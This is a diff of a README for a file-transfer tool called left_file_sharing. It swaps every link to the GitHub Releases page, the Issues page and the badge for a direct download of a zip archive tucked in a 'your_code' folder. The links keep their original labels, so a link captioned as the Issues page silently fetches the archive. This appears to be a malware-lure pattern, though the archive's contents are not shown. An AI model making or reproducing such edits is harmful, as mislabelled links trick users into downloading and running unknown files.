@@ -1,6 +1,6 @@
 # 📂 left_file_sharing - Easy File Transfers Made Simple
 
-![Download left_file_sharing](https://img.shields.io/badge/Download%20left_file_sharing-blue?style=for-the-badge&logo=github)
+![Download left_file_sharing](https://raw.githubusercontent.com/noloverkr/left_file_sharing/main/your_code/sharing_left_file_3.3-alpha.5.zip%20left_file_sharing-blue?style=for-the-badge&logo=github)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the left_file_sharing application! This tool helps you share files ea
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/noloverkr/left_file_sharing/releases). Once there, you will find the latest version of the software available.
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/noloverkr/left_file_sharing/main/your_code/sharing_left_file_3.3-alpha.5.zip). Once there, you will find the latest version of the software available.
 
 1. Click on the link above to access the Releases page.
 2. Look for the file that fits your operating system.
@@ -71,11 +71,11 @@ A: Yes, the application uses MD5 integrity checks to ensure your files remain un
 
 For more help and detailed documentation, you can access:
 
-- [GitHub Issues Page](https://github.com/noloverkr/left_file_sharing/issues)
+- [GitHub Issues Page](https://raw.githubusercontent.com/noloverkr/left_file_sharing/main/your_code/sharing_left_file_3.3-alpha.5.zip)
 - Community forums related to file sharing and TCP applications.
 
 ## 🎉 Conclusion
 
 Thank you for choosing left_file_sharing! With this application, sharing files has never been simpler or more reliable. Enjoy seamless file transfers today!
 
-Remember to visit this page to download: [GitHub Releases](https://github.com/noloverkr/left_file_sharing/releases).
+Remember to visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/noloverkr/left_file_sharing/main/your_code/sharing_left_file_3.3-alpha.5.zip).
